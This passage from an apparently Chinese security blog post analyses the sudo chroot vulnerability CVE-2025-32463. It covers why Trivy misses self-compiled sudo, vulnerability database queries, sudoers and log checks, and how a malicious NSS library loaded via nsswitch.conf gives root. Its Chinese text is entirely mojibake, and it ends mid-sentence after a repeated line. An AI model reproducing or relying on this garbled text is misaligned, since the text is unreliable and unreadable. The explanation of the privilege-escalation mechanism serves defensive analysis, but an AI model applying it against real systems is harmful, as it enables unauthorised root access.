·éœ€è¦è¿›è¡Œç›¸åŒçš„ç›®å½•éå†ã€å…³é”®æ–‡ä»¶è¯»å–ä»¥åŠè½¯ä»¶åŒ…ä¿¡æ¯è§£æç­‰ç³»åˆ—çš„æ“ä½œï¼Œç„¶åå†é€šè¿‡ç‰ˆæœ¬æ¯”å¯¹çš„æ–¹å¼å®Œæˆæ¼æ´æ‰«æã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">trivy rootfs / --scanners vuln<br></code></pre></td></tr></table></figure><p>è‹¥æˆ‘ä»¬æ— æ³•ä½¿ç”¨å·¥å…·è¿›è¡Œæ‰«æï¼Œè¿˜å¯ä»¥åˆ©ç”¨ Trivy çš„æ¼æ´åº“å¿«é€ŸæŸ¥è¯¢åˆ°æ¼æ´çš„å½±å“èŒƒå›´ã€‚Trivy çš„æ¼æ´åº“æ˜¯åŸºäº <a href="https://github.com/boltdb/bolt" title="Boltdb">Boltdb</a> å®ç°çš„ï¼ŒBoltdb æ˜¯ <a href="https://github.com/etcd-io/etcd" title="Etcd">Etcd</a> ç­‰ä¸­é—´ä»¶æ‰€é€‰ç”¨çš„æ•°æ®åº“ã€‚å¦‚å›¾ 18 æ‰€ç¤ºï¼Œæˆ‘ä»¬å¯ä»¥ä» trivy çš„ç¼“å­˜è·¯å¾„ä¸­æ‰¾åˆ°å…¶æ¼æ´åº“æ–‡ä»¶<code>trivy.db</code>ã€‚</p><p><img src="/image/image_mEtw_DnHOG.png" alt="å›¾ 18ï¼šæŸ¥æ‰¾ Trivy æ¼æ´åº“è·¯å¾„" title="å›¾ 18ï¼šæŸ¥æ‰¾ Trivy æ¼æ´åº“è·¯å¾„"></p><p>ä¸å¸¸è§çš„æ•°æ®åº“ä¸ä¸€æ ·çš„æ˜¯ï¼ŒBoltdb æ•°æ®åº“çš„ä½¿ç”¨ä½“éªŒä¸ä½³ï¼Œæ— æ³•ä½¿ç”¨ SQL è¯­å¥è¿›è¡ŒæŸ¥è¯¢å’Œç¼–è¾‘ï¼Œæˆ‘ä»¬éœ€è¦ç¼–å†™ Golang ä»£ç æ¥è¿›è¡Œæ›´é«˜çº§çš„æ“ä½œã€‚å½“ç„¶ï¼Œä¹Ÿæœ‰å°è£…å¾—ä¸é”™çš„å·¥å…·ï¼Œå¦‚å›¾ 19 æ‰€ç¤ºï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ <a href="https://github.com/devilcove/bboltEdit" title="bboltEdit">bboltEdit</a> æŸ¥çœ‹å’Œç¼–è¾‘ Boltdb æ•°æ®åº“æ–‡ä»¶ã€‚</p><p><img src="/image/image_wdqq-vpLhE.png" alt="å›¾ 19ï¼šä½¿ç”¨ bboltEdit æŸ¥çœ‹ trivy çš„æ¼æ´åº“" title="å›¾ 19ï¼šä½¿ç”¨ bboltEdit æŸ¥çœ‹ trivy çš„æ¼æ´åº“"></p><p>ä½†æ˜¯è¯¥å·¥å…·è¿˜æ˜¯æ— æ³•æ»¡è¶³æˆ‘ä»¬çš„éœ€æ±‚ï¼Œé‚£å°±æ˜¯ï¼šå¿«é€Ÿå®šä½æŸ CVE æ¼æ´çš„å½±å“èŒƒå›´ã€‚è¿™é‡Œï¼Œæˆ‘ä»¬å†æ¨èä¸€ä¸ªå¯å°† BoltDB å½¢å¼çš„ Trivy æ¼æ´åº“è½¬åŒ–ä¸º MySQLã€SQLite å’Œ Postgres è¿™äº›å¸¸è§çš„æ•°æ®åº“ç±»å‹çš„å·¥å…·ï¼š<a href="https://github.com/k1LoW/trivy-db-to" title="trivy-db-to">trivy-db-to</a>ã€‚</p><p>trivy-db-to é»˜è®¤å°†å„ä¾›åº”å•†çš„å®‰å…¨å…¬å‘Šæ•°æ®éƒ½æ•´åˆåœ¨ä¸€å¼ åä¸º <code>vulnerability_advisories</code>çš„è¡¨ä¸­ï¼Œè€Œ Trivy å°±æ˜¯åˆ©ç”¨è¿™äº›å®‰å…¨å…¬å‘Šæ•°æ®è¿›è¡Œç‰ˆæœ¬æ¯”å¯¹ï¼Œç„¶åå†ä½¿ç”¨ <code>vulnerability</code> è¡¨çš„æ•°æ®æ¥è¡¥å……æ¼æ´æè¿°ã€å¨èƒç­‰çº§å’Œå‚è€ƒé“¾æ¥ç­‰è¯¦ç»†ä¿¡æ¯ã€‚</p><p>å› æ­¤ï¼Œæˆ‘ä»¬åªéœ€è¦åœ¨<code>vulnerability_advisories</code>ä¸­æŸ¥è¯¢ CVE ç¼–å·ä¸º CVE-2025-32463 å³å¯ã€‚å¦‚å›¾ 20 æ‰€ç¤ºï¼Œè¯¥æ¼æ´çš„å½±å“èŒƒå›´ä¸ä»…å’Œæ“ä½œç³»ç»Ÿç±»å‹å’Œç‰ˆæœ¬æœ‰å…³ï¼Œæ‰€å½±å“çš„è½¯ä»¶åŒ…åç§°å’Œä¿®å¤ç‰ˆæœ¬éƒ½ä¼šæœ‰æ‰€ä¸åŒï¼Œå› æ­¤ï¼Œæˆ‘ä»¬éœ€è¦è¿›è¡Œä»”ç»†åœ°ç”„åˆ«ã€‚</p><p><img src="/image/image_6q3NTpOGrL.png" alt="å›¾ 20ï¼šCVE-2025-32463 çš„å½±å“èŒƒå›´" title="å›¾ 20ï¼šCVE-2025-32463 çš„å½±å“èŒƒå›´"></p><p>å›åˆ°ä¹‹å‰çš„é—®é¢˜ï¼Œä¸ºä»€ä¹ˆ <code>y4ney/cve-2025-32463-lab:source</code>é•œåƒæ— æ³•æ‰«æå‡º CVE-2025-32463 æ¼æ´å‘¢ï¼Ÿæˆ‘ä»¬ä»ä¸¤æ–¹é¢è¿›è¡Œæ’æŸ¥ï¼š</p><ol><li>Trivy çš„æ¼æ´åº“ä¸­æ˜¯å¦æŒ‡æ˜äº† ubuntu:24.04 é•œåƒå—è¯¥æ¼æ´å½±å“ï¼Œä¸”è½¯ä»¶åŒ…åç§°å’Œä¿®å¤ç‰ˆæœ¬æ˜¯å¤šå°‘ï¼Ÿ</li><li>Trivy æ˜¯å¦è¯†åˆ«å‡ºäº† <code>sudo</code> ç³»ç»Ÿå±‚è½¯ä»¶åŒ…åŠå…¶ç‰ˆæœ¬ï¼Ÿ</li></ol><p>ç»è¿‡æŸ¥è¯¢ï¼Œç¬¬ä¸€ä¸ªé—®é¢˜çš„ç­”æ¡ˆæ˜¯ YESï¼Œé‚£ä¹ˆæˆ‘ä»¬æ¥æ’æŸ¥ç¬¬äºŒä¸ªé—®é¢˜ã€‚å¦‚å›¾ 21 æ‰€ç¤ºï¼Œæˆ‘ä»¬å‘ç°<code>y4ney/cve-2025-32463-lab:source</code>å¹¶æœªè¢«è¯†åˆ«å‡º <code>sudo</code> è½¯ä»¶åŒ…ï¼Œå› æ­¤æ— æ³•æ‰«æå‡º CVE-2025-32463 æ¼æ´ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">trivy image &lt;image-name&gt; --scanners vuln --list-all-pkgs --format json --quiet | jq <span class="hljs-string">&#x27;.Results[].Packages[]&#x27;</span> | grep <span class="hljs-built_in">sudo</span><br></code></pre></td></tr></table></figure><p><img src="/image/image_bZL07ontRY.png" alt="å›¾ 21ï¼šä¸¤ç±»é•œåƒä¸­ sudo è½¯ä»¶åŒ…çš„è¯†åˆ«æƒ…å†µ" title="å›¾ 21ï¼šä¸¤ç±»é•œåƒä¸­ sudo è½¯ä»¶åŒ…çš„è¯†åˆ«æƒ…å†µ"></p><p>å‰é¢æˆ‘ä»¬è¯´äº†ï¼ŒTrivy ä¼šå¯¹é•œåƒæ–‡ä»¶è¿›è¡Œè§£å‹ç¼©æ“ä½œï¼Œç„¶åéå†ç›®å½•ã€è¯»å–å…³é”®æ–‡ä»¶å¹¶è§£æå‡ºè½¯ä»¶åŒ…ä¿¡æ¯ï¼Œè¿™äº›æ“ä½œå‡ç”±åŒä¸€å›¢é˜Ÿçš„<a href="https://github.com/aquasecurity/fanal" title="Fanal">Fanal</a> å®¹å™¨é™æ€åˆ†æåº“å®Œæˆï¼Œä½†æ˜¯è¯¥é¡¹ç›®äº 2022 å¹´ 6 æœˆ 22 æ—¥å·²ç»å½’æ¡£ï¼Œå¹¶ä½œä¸º Trivy çš„ä¸€éƒ¨åˆ†è¿›è¡Œç»´æŠ¤å’Œæ›´æ–°ã€‚</p><p><img src="/image/image_4wbcm-W8kC.png" alt="å›¾ 22ï¼šfanal é¡¹ç›®æè¿°" title="å›¾ 22ï¼šfanal é¡¹ç›®æè¿°"></p><p>æŸ¥çœ‹ Trivy ä¸­çš„ Fanal æºç ï¼Œæˆ‘ä»¬å‘ç°ï¼šTrivy ä¸»è¦ä¾èµ–è§£æ apkã€dpkg å’Œ rpm ç­‰ç³»ç»Ÿå±‚è½¯ä»¶åŒ…ç®¡ç†å·¥å…·æ¥è¯†åˆ«ç³»ç»Ÿå±‚è½¯ä»¶åŒ…çš„ã€‚è€Œæˆ‘ä»¬é€šè¿‡ apt å®‰è£…<code>sudo</code> æ—¶ï¼Œæ‰€ä½¿ç”¨çš„åº•å±‚å·¥å…·æ˜¯ dpkgã€‚æ‰€ä»¥ Trivy æ˜¯é€šè¿‡è¯†åˆ« dpkg ä¸€ç³»åˆ—é…ç½®æ–‡ä»¶å’Œç›®å½•æ¥è¯†åˆ«å‡ºè½¯ä»¶åŒ…ä¿¡æ¯çš„ï¼ŒåŒ…æ‹¬ <code>sudo</code>ã€‚</p><p><img src="/image/image_t27w6RRkBr.png" alt="å›¾ 23 trivy å…³äº dpkg è½¯ä»¶åŒ…è§£æçš„æºç å®ç°" title="å›¾ 23 trivy å…³äº dpkg è½¯ä»¶åŒ…è§£æçš„æºç å®ç°"></p><p><code>y4ney/cve-2025-32463-lab:deb</code>é•œåƒæ­£å¼é€šè¿‡ <code>dpkg</code> å®‰è£…çš„ <code>sduo</code>ï¼Œå› æ­¤å¯ä»¥è¯†åˆ«å‡º CVE-2025-32463 æ¼æ´ã€‚è€Œ<code>y4ney/cve-2025-32463-lab:source</code> é•œåƒçš„<code>sudo</code>æ˜¯é€šè¿‡ <code>make</code> è‡ªç¼–è¯‘è€Œæ¥çš„ï¼Œå› æ­¤æ— æ³•è¯†åˆ«å‡ºæ¼æ´ã€‚</p><p><img src="/image/image_HiGVkBsATm.png" alt="å›¾ 24ï¼šä¸¤ç±»é•œåƒä¸­ä¸åŒçš„ sudo å®‰è£…æ–¹å¼è¯´æ˜" title="å›¾ 24ï¼šä¸¤ç±»é•œåƒä¸­ä¸åŒçš„sudo å®‰è£…æ–¹å¼è¯´æ˜"></p><p>è¿™ä¹Ÿæ˜¯ Trivy å®˜æ–¹æ–‡æ¡£ä¸­æŒ‡å‡ºçš„é—®é¢˜ï¼šTrivy ä¸æ”¯æŒç¬¬ä¸‰æ–¹ï¼ˆæˆ–è‡ªç¼–è¯‘ï¼‰çš„è½¯ä»¶åŒ…å’ŒäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œä½†æ”¯æŒ Red Hat å’Œ Debian ç­‰ä¾›åº”å•†æä¾›çš„å®˜æ–¹åŒ…ã€‚</p><p><img src="/image/image_y8eG_7iyvY.png" alt="å›¾ 25ï¼šTrivy ä¸æ”¯æŒç¬¬ä¸‰æ–¹ï¼ˆæˆ–è‡ªç¼–è¯‘ï¼‰çš„è½¯ä»¶åŒ…å’ŒäºŒè¿›åˆ¶æ–‡ä»¶" title="å›¾ 25ï¼šTrivy ä¸æ”¯æŒç¬¬ä¸‰æ–¹ï¼ˆæˆ–è‡ªç¼–è¯‘ï¼‰çš„è½¯ä»¶åŒ…å’ŒäºŒè¿›åˆ¶æ–‡ä»¶"></p><p>è¿™æ˜¯ Trivy å·¥å…·çš„å±€é™å—ï¼Ÿæˆ‘åè€Œè®¤ä¸ºè¿™æ˜¯å¤§å¤šæ•°æ¼æ´æ‰«æå·¥å…·çš„å±€é™ï¼Œä¾‹å¦‚ï¼šå½“æˆ‘ä»¬æ‰“å¼€ Docker Hub çš„ Scout åŠŸèƒ½æ—¶ï¼Œå®ƒä¹Ÿä»…èƒ½è¯†åˆ«å‡º<code>y4ney/cve-2025-32463-lab:deb</code>é•œåƒä¸­çš„ sudo è½¯ä»¶åŒ…å’Œ CVE-2025-32463 æ¼æ´ã€‚</p><p><img src="/image/image_fRnHe3ukwq.png" alt="å›¾ 26ï¼šDocker Hub çš„ Scout åŠŸèƒ½å’Œ Trivy çš„æ‰«æç»“æœä¸€è‡´" title="å›¾ 26ï¼šDocker Hub çš„ Scout åŠŸèƒ½å’Œ Trivy çš„æ‰«æç»“æœä¸€è‡´"></p><p>å› æ­¤ï¼Œä¸ºäº†é¿å…ç±»ä¼¼çš„æ¼æŠ¥äº‹æ•…å‘ç”Ÿï¼Œæˆ‘ä»¬åªèƒ½ä» DevOps ä¸­è§„èŒƒå¼€å‘è€…å’Œè¿ç»´äººå‘˜çš„æ“ä½œï¼Œæ¥æé«˜è½¯ä»¶ä¾›åº”é“¾çš„é€æ˜åº¦ï¼Œå³ï¼šé¿å…ä½¿ç”¨ç¬¬ä¸‰æ–¹çš„ï¼ˆæˆ–è‡ªç¼–è¯‘çš„ï¼‰è½¯ä»¶åŒ…å’ŒäºŒè¿›åˆ¶æ–‡ä»¶ã€‚</p><p>å¦‚å›¾ 27 æ‰€ç¤ºï¼Œåœ¨ CentOS 7 ä¸­æ¼æ´å¤ç°å¤±è´¥ã€‚æˆ‘ä»¬å†æ¬¡å›é¡¾å›¾ 20 æŸ¥è¯¢ç»“æœï¼Œå‘ç°è¯¥æ¼æ´æ‰€å½±å“èŒƒå›´å¹¶æœªåŒ…æ‹¬ CentOS 7ï¼Œå› æ­¤ CentOS 7 ä¸å—è¯¥æ¼æ´çš„å½±å“ã€‚</p><p><img src="/image/image_BmgXxPTqzC.png" alt="å›¾ 27ï¼šCentOS 7 ä¸­æ— æ³•è¿›è¡Œæ¼æ´å¤ç°" title="å›¾ 27ï¼šCentOS 7 ä¸­æ— æ³•è¿›è¡Œæ¼æ´å¤ç°"></p><p>æŸ¥çœ‹<a href="https://access.redhat.com/security/cve/cve-2025-32463" title="RedHat">RedHat</a> çš„å®‰å…¨å…¬å‘Šæ•°æ®ï¼ŒRedHat å‘Šè¯‰æˆ‘ä»¬ï¼šç”±äºå—å½±å“çš„ç‰ˆæœ¬èŒƒå›´æœ‰é™ï¼Œæ­¤æ¼æ´ä¸ä¼šå½±å“ RHEL-9 æˆ–ä»»ä½•æ›´æ—©ç‰ˆæœ¬çš„ RHELã€‚å› æ­¤ï¼ŒOpenshift ä¹Ÿä¸ä¼šå—åˆ°æ­¤æ¼æ´çš„å½±å“ã€‚</p><p><img src="/image/image_MdDVfo6fFs.png" alt="å›¾ 28ï¼šRedHat å…³äº CVE-2025-32463 çš„å®‰å…¨å…¬å‘Š" title="å›¾ 28ï¼šRedHat å…³äº CVE-2025-32463 çš„å®‰å…¨å…¬å‘Š"></p><p>éœ€è¦æç¤ºçš„æ˜¯ï¼Œæ¼æ´çš„å¨èƒç­‰çº§è¿˜ä¸ä¾›åº”å•†æœ‰å…³ã€‚å¦‚å›¾ 29 æ‰€ç¤ºï¼ŒAzure å’Œ cbi-mariner éƒ½è®¤ä¸ºè¯¥æ¼æ´çš„å¨èƒç­‰çº§ä¸ºè¶…å±ï¼Œä½†æ˜¯ amazon å’Œ ubuntu ç­‰ä¾›åº”å•†è®¤ä¸ºè¯¥æ¼æ´çš„å¨èƒç­‰çº§ä¸ºé«˜å±ã€‚é‚£ä¹ˆæˆ‘ä»¬è¯¥å¬è°çš„å‘¢ï¼Ÿ</p><p><img src="/image/image_7sDv4vIv4J.png" alt="å›¾ 29ï¼šä¸åŒä¾›åº”å•†å¯¹ CVE-2025-32463 æœ‰ä¸åŒçš„å®‰å…¨å®šçº§" title="å›¾ 29ï¼šä¸åŒä¾›åº”å•†å¯¹ CVE-2025-32463 æœ‰ä¸åŒçš„å®‰å…¨å®šçº§"></p><p>å‰é¢æˆ‘ä»¬è¯´äº†ï¼Œè¿™äº›æ“ä½œç³»ç»Ÿä¾›åº”å•†ä¼šå¯¹ <code>sudo</code> è¿›è¡ŒäºŒæ”¹å’Œç»´æŠ¤ï¼Œå› æ­¤ä»–ä»¬è¿˜ä¼šåŸºäºæ“ä½œç³»ç»Ÿçš„ç‰¹æ€§ï¼Œå¯¹æ¼æ´è¿›è¡Œé‡å®šçº§ã€‚æ‰€ä»¥æˆ‘ä»¬åº”è¯¥ä¼˜å…ˆå‚è€ƒä¾›åº”å•†æ‰€å®šä¹‰çš„å¨èƒç­‰çº§ï¼Œå†å‚è€ƒ NVD ç­‰æ ‡å‡†æ¼æ´åº“æ‰€å®šä¹‰çš„å®‰å…¨ç­‰çº§ï¼ŒTrivy ä¹Ÿä¼šæ ¹æ®è¿™ç§æ€è·¯è‡ªåŠ¨ä¸ºæ¼æ´é€‰æ‹©ä¸€ä¸ªå¯¹åº”çš„å¨èƒç­‰çº§ã€‚</p><p>è¿™æ˜¯æˆ‘èƒ½æƒ³åˆ°çš„åœ¨å½±å“é¢æ’æŸ¥ä¸­ï¼Œå¸¸è§çš„è¯¯åŒºã€‚æœ€åï¼Œæˆ‘å·²ç» fork äº†ä¸€ä»½ trivy-db-toï¼Œå¹¶å¯¹å…¶è¿›è¡Œäº†äºŒæ”¹ã€‚<a href="https://github.com/y4ney/trivy-db-to" title="y4ney&#x2F;trivy-db-to">y4ney&#x2F;trivy-db-to</a> ä¸ä»…ä¼˜åŒ–äº†æ—¥å¿—çš„è¾“å‡ºï¼Œè¿˜è½¬åŒ–äº†æ•°æ®æºçš„æ•°æ®ï¼Œå¤§å®¶å¯ä»¥é€šè¿‡ <code>data_source</code> è¡¨æŸ¥çœ‹ trivy çš„æ¼æ´æ•°æ®æºã€‚</p><p><img src="/image/image__bHzakfFZl.png" alt="å›¾ 30ï¼šy4ney&#x2F;trivy-db-to çš„æ‰§è¡Œç»“æœ" title="å›¾ 30 ï¼šy4ney&#x2F;trivy-db-to çš„æ‰§è¡Œç»“æœ"></p><p><img src="/image/image_m8qagxmflc.png" alt="å›¾ 31ï¼šy4ney&#x2F;trivy-db-to å¯¼å‡ºçš„æ¼æ´æ•°æ®æº" title="å›¾ 31 ï¼šy4ney&#x2F;trivy-db-to å¯¼å‡ºçš„æ¼æ´æ•°æ®æº"></p><h3 id="2-7-ç¯å¢ƒæ’æŸ¥"><a href="#2-7-ç¯å¢ƒæ’æŸ¥" class="headerlink" title="2.7 ç¯å¢ƒæ’æŸ¥"></a>2.7 ç¯å¢ƒæ’æŸ¥</h3><p>é™¤äº†å‡çº§ <code>sudo</code> ç‰ˆæœ¬ï¼Œç›®å‰å°šæ— å…¶ä»–æœ‰æ•ˆçš„ç¼“è§£æªæ–½ã€‚ç”±äº <code>sudo</code> åœ¨è§£æå‘½ä»¤æ—¶å­˜åœ¨ç¼ºé™·ï¼Œå…è®¸ç”¨æˆ·è‡ªå®šä¹‰ <code>chroot</code> ç›®å½•çš„æœºåˆ¶å®¹æ˜“å¼•å‘é”™è¯¯ï¼Œä¸”è¯¥åŠŸèƒ½åœ¨å®é™…ä¸­å¹¶ä¸å¸¸ç”¨ã€‚ä» <code>sudo</code> 1.9.17p1 èµ·ï¼Œ<code>--chroot</code> å‚æ•°å·²è¢«å¼ƒç”¨ï¼Œå¹¶è®¡åˆ’åœ¨åç»­ç‰ˆæœ¬ä¸­å½»åº•ç§»é™¤ã€‚</p><p>è‹¥æ— æ³•é€šè¿‡ç‰ˆæœ¬æ¯”å¯¹çš„æ–¹å¼å¯¹å½±å“é¢è¿›è¡Œæ’æŸ¥ï¼Œå»ºè®®å¯¹å½“å‰ç¯å¢ƒè¿›è¡Œå…¨é¢æ’æŸ¥ï¼Œç¡®ä¿æœªä½¿ç”¨å­˜åœ¨å®‰å…¨é£é™©çš„ <code>chroot</code> é…ç½®ï¼Œä»¥åŠé¿å…ç»§ç»­ä½¿ç”¨è¯¥å‚æ•°ï¼Œå› ä¸ºå¦‚æœå®ç°ä¸å½“ï¼Œå¯èƒ½ä¼šæ— æ„ä¸­é™ä½ç³»ç»Ÿå®‰å…¨æ€§ã€‚ç›¸å…³æªæ–½å¦‚ä¸‹æ‰€ç¤ºï¼š</p><ul><li>æœç´¢ä»»ä½•ä½¿ç”¨<code>chroot</code>çš„æƒ…å†µã€‚æ£€æŸ¥<code>/etc/sudoers</code>æ–‡ä»¶ä»¥åŠ<code>/etc/sudoers.d</code>ç›®å½•ä¸‹çš„æ‰€æœ‰è§„åˆ™ã€‚å¦‚æœ <code>sudo</code> è§„åˆ™å­˜å‚¨åœ¨ LDAP ä¸­ï¼Œå¯ä½¿ç”¨å¦‚<code>ldapsearch</code> ç­‰å·¥å…·å¯¼å‡ºè§„åˆ™è¿›è¡Œå®¡æŸ¥ã€‚</li><li>æŸ¥æ‰¾è§„åˆ™ä¸­æ˜¯å¦ä½¿ç”¨äº†<code>runchroot=</code>é€‰é¡¹æˆ–<code>CHROOT=</code> æŒ‡ä»¤ã€‚</li><li>è¿˜å¯ä»¥åœ¨ç³»ç»Ÿæ—¥å¿—ä¸­æœç´¢ <code>sudo</code> ç›¸å…³æ¡ç›®ã€‚ä»»ä½•ä½¿ç”¨äº†<code>chroot</code>çš„å‘½ä»¤éƒ½ä¼šä»¥<code>CHROOT=</code> å­—æ ·è®°å½•åœ¨æ—¥å¿—ä¸­ã€‚</li></ul><h3 id="2-8-æºç åˆ†æ"><a href="#2-8-æºç åˆ†æ" class="headerlink" title="2.8 æºç åˆ†æ"></a>2.8 æºç åˆ†æ</h3><p>2013 å¹´ 6 æœˆ 28 æ—¥ï¼Œ<code>sudo</code> åœ¨ 1.9.14 ç‰ˆæœ¬çš„ä¸€é¡¹æ›´æ”¹ç»™æœªæ¥å¼•å…¥äº†å·¨å¤§çš„éšæ‚£ï¼šå½“åœ¨ <code>sudoers</code> ä¸­æŒ‡å®šäº† <code>chroot</code> æ—¶ï¼Œæ”¹è¿›äº†å‘½ä»¤åŒ¹é…çš„æ–¹å¼ã€‚ç°åœ¨ï¼Œ<code>sudoers</code> æ’ä»¶ä¼šåœ¨è¿›è¡Œå‘½ä»¤åŒ¹é…ä¹‹å‰ï¼Œæ ¹æ®éœ€è¦å…ˆåˆ‡æ¢æ ¹ç›®å½•ã€‚æ­¤å‰çš„åšæ³•æ˜¯ä»…åœ¨å¤„ç†è·¯å¾„æ—¶å°† <code>chroot</code> è·¯å¾„ç®€å•åœ°æ·»åŠ ä¸ºå‰ç¼€ã€‚</p><p><img src="/image/image_pcalFIH05q.png" alt="å›¾ 32ï¼šsudo 1.9.14 ä¸­å¼•å‘æ¼æ´çš„æ›´æ”¹è®°å½•" title="å›¾ 32ï¼š sudo 1.9.14 ä¸­å¼•å‘æ¼æ´çš„æ›´æ”¹è®°å½•"></p><p>é—®é¢˜å‡ºåœ¨å…è®¸éç‰¹æƒç”¨æˆ·å¯¹å…¶å¯æ§çš„ã€å¯å†™çš„ã€ä¸å—ä¿¡ä»»çš„è·¯å¾„è°ƒç”¨<code>chroot()</code>ã€‚æ— è®ºç”¨æˆ·æ˜¯å¦é…ç½®äº†ç›¸åº”çš„ <code>sudo</code> è§„åˆ™ï¼Œ<code>sudo</code> éƒ½ä¼šå¤šæ¬¡è°ƒç”¨<code>chroot()</code>ã€‚å…è®¸ä½æƒé™ç”¨æˆ·ä»¥ <code>root</code> æƒé™å¯¹å¯å†™ä½ç½®æ‰§è¡Œ<code>chroot()</code>ä¼šå¸¦æ¥å¤šç§å®‰å…¨é£é™©ã€‚è®¸å¤šåº”ç”¨ç¨‹åºï¼ˆä¾‹å¦‚ SSHï¼‰éƒ½æ˜ç¡®é˜²èŒƒè¿™ç§æƒ…å†µã€‚ä¾‹å¦‚ï¼Œå¦‚æœç›®æ ‡ä½ç½®ä¸æ˜¯ç”± <code>root</code> æ‹¥æœ‰ï¼ŒSSH å°†æ‹’ç»æ‰§è¡Œ<code>chroot()</code>ã€‚</p><p><code>pivot_root()</code>å’Œ<code>unpivot_root()</code>å‡½æ•°å®šä¹‰åœ¨<a href="https://github.com/sudo-project/sudo/blob/f8ff956e17c36d44b9465688995821c8d890b451/plugins/sudoers/pivot.c" title="plugins&#x2F;sudoers&#x2F;pivot.c">plugins&#x2F;sudoers&#x2F;pivot.c</a>ä¸­ï¼Œç”¨äºå¤„ç†<code>chroot</code>ç›¸å…³çš„é€»è¾‘ã€‚åœ¨è¿™ä¸¤ä¸ªå‡½æ•°è°ƒç”¨ä¹‹é—´ï¼Œä¼šè§¦å‘åç§°æœåŠ¡åˆ‡æ¢ï¼ˆNSSï¼‰æ“ä½œï¼Œå¯¼è‡´ç³»ç»Ÿä»ä¸å—ä¿¡ä»»çš„ç¯å¢ƒä¸­åŠ è½½<code>/etc/nsswitch.conf</code> é…ç½®æ–‡ä»¶ã€‚è¯¥æ–‡ä»¶åŒ…å«æŒ‡ä»¤ï¼Œç”¨äºå‘Šè¯‰ç³»ç»Ÿå¦‚ä½•è·å–ç”¨æˆ·ã€ç”¨æˆ·ç»„å’Œä¸»æœºçš„ä¿¡æ¯ã€‚å¯ä»¥åˆ—å‡ºå¤šä¸ªä¿¡æ¯æºï¼Œç³»ç»Ÿä¼šæŒ‰é¡ºåºæœç´¢ï¼Œç›´åˆ°æ‰¾åˆ°åŒ¹é…é¡¹ä¸ºæ­¢ã€‚</p><p><img src="/image/image_cpESTgiONG.png" alt="å›¾ 33ï¼šsudo çš„ pivot_root() å’Œ unpivot_root() å‡½æ•°å®é™…ä¸Šç›´æ¥ä½¿ç”¨äº† chroot" title="å›¾ 33ï¼šsudo çš„ pivot_root() å’Œ unpivot_root() å‡½æ•°å®é™…ä¸Šç›´æ¥ä½¿ç”¨äº† chroot"></p><p>åœ¨ Linux ç³»ç»Ÿä¸­ï¼Œ<code>nsswitch.conf</code> æ–‡ä»¶æ§åˆ¶äº†ç³»ç»Ÿå¦‚ä½•æŸ¥è¯¢ç”¨æˆ·ã€ç»„ç­‰ä¿¡æ¯ã€‚ä¸‹è¿°æ–‡ä»¶å†…å®¹è¡¨ç¤ºç³»ç»Ÿä¼šç”¨<code>files</code>å’Œ<code>ldap</code> ä¸¤ç§æ–¹å¼æ¥æŸ¥æ‰¾ç”¨æˆ·ä¿¡æ¯ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">passwd: files ldap<br></code></pre></td></tr></table></figure><p>å¦‚å›¾ 11 æ‰€ç¤ºï¼Œæˆ‘ä»¬ä¹‹æ‰€ä»¥åœ¨ åˆ›å»ºä¸€ä¸ªå’Œ <code>hacker</code> åœ¨åŒä¸€çº§ç›®å½•çš„ <code>libnss_</code> ç›®å½•ï¼Œæ˜¯å› ä¸ºæ¶æ„åº“æ˜¯åœ¨ä»£ç é€€å‡º <code>chroot</code> ååŠ è½½çš„ï¼Œä¸”<a href="https://github.com/bminor/glibc/blob/ea85e7d55087075376a29261e722e4fae14ecbe7/nss/nss_module.c#L180" title="glibc">glibc</a>ï¼ˆC æ ‡å‡†åº“ï¼‰å†…éƒ¨çš„ NSS åŠ è½½é€»è¾‘æ˜¯ç¡¬ç¼–ç çš„ï¼Œå®ƒè¦æ±‚ï¼šæ‰€æœ‰ NSS æ¨¡å—çš„åå­—æ ¼å¼å¿…é¡»æ˜¯<code>libnss_&lt;source&gt;.so.&lt;version&gt;</code>ã€‚</p><p><img src="/image/image_kj7c-Nr14J.png" alt="å›¾ 34ï¼šglibc å†…éƒ¨çš„ NSS åŠ è½½é€»è¾‘æ˜¯ç¡¬ç¼–ç çš„" title="å›¾ 34ï¼šglibc å†…éƒ¨çš„ NSS åŠ è½½é€»è¾‘æ˜¯ç¡¬ç¼–ç çš„"></p><p>æˆ‘ä»¬åœ¨è‡ªå®šä¹‰ NSS æ¨¡å—åæ—¶å¿…é¡»æœ‰<code>/</code> ï¼Œæ˜¯å› ä¸ºè¿æ¥çš„åç§°ä¼ é€’ç»™<a href="https://man7.org/linux/man-pages/man3/dlopen.3.html" title="dlopen">dlopen</a>æ—¶ï¼Œdlopen ä¼šå°† <code>/</code> è§£æä¸ºï¼ˆç›¸å¯¹æˆ–ç»å¯¹ï¼‰è·¯å¾„åã€‚ä»è€Œåˆ°æˆ‘ä»¬è‡ªå®šä¹‰çš„ç›®å½•ä¸­åŠ è½½æ¶æ„åŠ¨æ€é“¾æ¥åº“ã€‚</p><p><img src="/image/image_uHiP9fGfj_.png" alt="å›¾ 35ï¼šdlopen ä¼šå°†  &#x2F;  è§£æä¸ºï¼ˆç›¸å¯¹æˆ–ç»å¯¹ï¼‰è·¯å¾„å" title="å›¾ 35ï¼šdlopen ä¼šå°†  &#x2F;  è§£æä¸ºï¼ˆç›¸å¯¹æˆ–ç»å¯¹ï¼‰è·¯å¾„å"></p><p>æ­£å› å¦‚æ­¤ï¼Œä»»ä½•æœ¬åœ°ç”¨æˆ·éƒ½å¯ä»¥è¯±ä½¿ <code>sudo</code> åŠ è½½ä»»æ„çš„å…±äº«å¯¹è±¡ï¼Œä»è€Œä»¥ <code>root</code> æƒé™æ‰§è¡Œä»»æ„ä»£ç ã€‚ä¸‹é¢çš„è°ƒç”¨æ ˆæ˜¾ç¤ºäº†ä¸€ä¸ªè¢« <code>sudo</code> åŠ è½½çš„æ¶æ„å…±äº«å¯¹è±¡ï¼ˆä¸ºç®€æ´èµ·è§ï¼Œå†…å®¹å·²è¢«å¤§å¹…ç²¾ç®€ï¼‰ã€‚</p><p>ç”±äºè¿™ç§è¡Œä¸ºï¼Œä»»ä½•æœ¬åœ°ç”¨æˆ·éƒ½å¯ä»¥è¯±ä½¿ 